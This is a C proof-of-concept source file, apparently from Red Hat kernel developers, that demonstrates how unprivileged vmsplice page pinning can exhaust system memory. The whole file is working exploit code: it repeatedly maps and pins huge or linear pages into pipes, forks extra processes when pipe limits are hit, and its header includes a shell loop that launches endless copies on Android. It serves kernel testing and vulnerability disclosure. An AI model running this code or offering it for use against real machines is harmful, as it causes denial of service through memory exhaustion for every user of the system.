// SPDX-License-Identifier: GPL-3.0-or-later
/*
 *  proof of concept testcase showing the side effects caused by
 *  unprivileged unconstrained long term GUP pins done by vmsplice.
 *
 *  Copyright (C) 2021  Red Hat, Inc.
 *
 *  IMPORTANT: use at your own risk. Don't try to run this unless you
 *  know what you're doing.
 *
 *  gcc -O2 -o vmsplice-oom vmsplice-oom.c -Wall
 *  ./vmsplice-oom [--fork] [--linear]
 *  ./vmsplice-oom
 *  ./vmsplice-oom --fork
 *
 *  On Android this should allow to test:
 *  while :; do ./vmsplice-oom --linear & done
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <unistd.h>

#define _PAGE_SHIFT 12
#define _PAGE_SIZE (1UL<<_PAGE_SHIFT)
#define NONLINAER_SHIFT 9
#define PAGES_TO_PIN 256

int main(int argc, char *argv[]) {
	bool multi_process = false;
	bool linear = false;
	int match = 1;
	for (int i=1; i < argc; i++) {
		if (!strcmp(argv[i], "--fork"))
			multi_process = true, match++;
		if (!strcmp(argv[i], "--linear"))
			linear = true, match++;
	}
	if (match != argc)
		printf("%s [--fork] [--linear]\n",
		       argv[0]), exit(1);

	unsigned long page_size = _PAGE_SIZE;
	if (!linear)
		page_size <<= NONLINAER_SHIFT;
	unsigned long page_mask = ~(page_size-1);
	unsigned long area_size = page_size * PAGES_TO_PIN + ~page_mask;
	unsigned long pages_to_pin = PAGES_TO_PIN;

	bool full = false;
	for (;;) {
		void *area;
		area = mmap(0, area_size, PROT_READ|PROT_WRITE,
			    MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
		if (area == MAP_FAILED)
			perror("mmap"), exit(1);
		if (!linear && madvise(area, area_size, MADV_HUGEPAGE) < 0)
			perror("madvise"), exit(1);

		int pipe_fds[2];
		if (pipe(pipe_fds) < 0)
			goto next_process;
		if (!full &&
		    fcntl(pipe_fds[0], F_SETPIPE_SZ,
			  pages_to_pin*_PAGE_SIZE) < 0) {
			if (close(pipe_fds[0]) < 0)
				perror("close"), exit(1);
			if (close(pipe_fds[1]) < 0)
				perror("close"), exit(1);
			if (munmap(area, area_size) < 0)
				perror("munmap"), exit(1);
			page_size = _PAGE_SIZE;
			page_mask = ~(page_size-1);
			area_size = page_size + ~page_mask;
			linear = true;
			pages_to_pin = 1;
			continue;
		}

		char *page = (void *) ((((unsigned long) area) + ~page_mask) &
				       page_mask);

		if (!linear) {
			struct iovec iov[pages_to_pin];
			for (int i=0; i < pages_to_pin; i++) {
				char *_page = page + i * page_size;
				*_page = 0;
				iov[i].iov_base = _page;
				iov[i].iov_len = _PAGE_SIZE;
			}

			if (vmsplice(pipe_fds[1], iov, pages_to_pin, 0) < 0)
				perror("vmsplice"), exit(1);
		} else {
			for (int i=0; i < pages_to_pin; i++) {
				char *_page = page + i * _PAGE_SIZE;
				*_page = 0;
			}
			struct iovec iov = {
				.iov_base = page,
				.iov_len = _PAGE_SIZE*pages_to_pin,
			};

			if (vmsplice(pipe_fds[1], &iov, 1, 0) < 0)
				perror("vmsplice"), exit(1);
		}
		if (munmap(area, area_size) < 0)
			perror("munmap"), exit(1);
		continue;

	next_process:
		if (munmap(area, area_size) < 0)
			perror("munmap"), exit(1);
		if (!multi_process)
			pause(), exit(0);
		pid_t pid = fork();
		if (pid < 0)
			perror("fork"), exit(1);
		if (!pid)
			pause(), exit(0);
	}
}
